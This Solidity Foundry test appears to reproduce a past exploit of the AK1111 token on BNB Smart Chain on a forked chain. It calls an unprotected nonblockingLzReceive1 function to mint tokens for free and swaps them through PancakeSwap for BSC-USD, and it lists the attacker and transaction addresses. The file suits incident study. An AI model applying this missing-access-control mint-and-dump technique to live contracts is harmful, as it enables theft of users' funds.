// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 31.5K USD
// Attacker : https://bscscan.com/address/0xCe21C6e4fa557A9041FA98DFf59A4401Ef0a18aC
// Attack Contract : https://bscscan.com/address/0xbFD7280B11466bc717EB0053A78675aed2C2E388
// Vulnerable Contract : https://bscscan.com/address/0xc3B1b45e5784A8efececfC0BE2E28247d3f49963
// Attack Tx : https://bscscan.com/tx/0xc29c98da0c14f4ca436d38f8238f8da1c84c4b1ee6480c4b4facc4b81a013438

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xc3B1b45e5784A8efececfC0BE2E28247d3f49963#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1860554838897197135
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
address constant AK1111_ADDR = 0xc3B1b45e5784A8efececfC0BE2E28247d3f49963;
address constant CAKE_LP = 0x794ed5E8251C4A8D321CA263D9c0bC8Ecf5fA1FF;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

contract Ak1111 is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 44280829 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = BSC_USD;
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        IAk1111 ak1111 = IAk1111(AK1111_ADDR);
        uint256 ak1111Balance = ak1111.balanceOf(CAKE_LP);

        // this function is lack of access control. anyone call it to mint AK1111 token for free
        ak1111.nonblockingLzReceive1(0, address(this), ak1111Balance, "");

        ak1111.approve(PANCAKE_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = AK1111_ADDR;
        path[1] = BSC_USD;
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(ak1111Balance, 0, path, address(this), block.timestamp);
    }
}

interface IAk1111 is IERC20 {
    function nonblockingLzReceive1(uint16 _srcChainId, address _srcAddress, uint256 _nonce, bytes memory _payload) external;
}
